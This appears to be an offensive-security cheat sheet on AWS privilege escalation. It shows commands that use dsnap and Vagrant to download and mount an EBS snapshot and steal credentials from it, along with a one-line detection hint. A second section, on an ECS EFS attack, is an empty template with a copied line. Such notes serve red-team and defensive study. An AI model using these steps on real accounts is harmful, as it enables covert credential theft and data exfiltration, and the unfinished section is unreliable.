# AWS Privilege Escalation - II

### EBS direct APIs and Snapshot

**Description:** 

- Attacker enumerates all of the Elastic Block Store volumes, snapshots, and snapshot permissions in the account
- Downloading if any EBS snapshot available
- Explore th snapshot using Vagrant and Virtualbox
- Steal credentials from it

**How to Exploit??**

    dsnap get <instance-id> # Pacu feature 
    
The temporary snapshot is downloaded to i-0d706e33814c1ef9a.img

    $ IMAGE="i-0d706e33814c1ef9a.img" vagrant up
    $ IMAGE="i-0d706e33814c1ef9a.img" vagrant ssh

**Potential Impact:**

Using the EBS Direct APIs can be a simple and effective way to exfiltrate data and discover secrets in an AWS network without alerting anyone.
Can be alerted by monitoring `ec2:ModifySnapshotAttribute` attribute

---

### ECS EFS attack

**Description:** 

- 

**How to Exploit??**

    
    
The temporary snapshot is downloaded to i-0d706e33814c1ef9a.img

    $ 

**Potential Impact:**



---
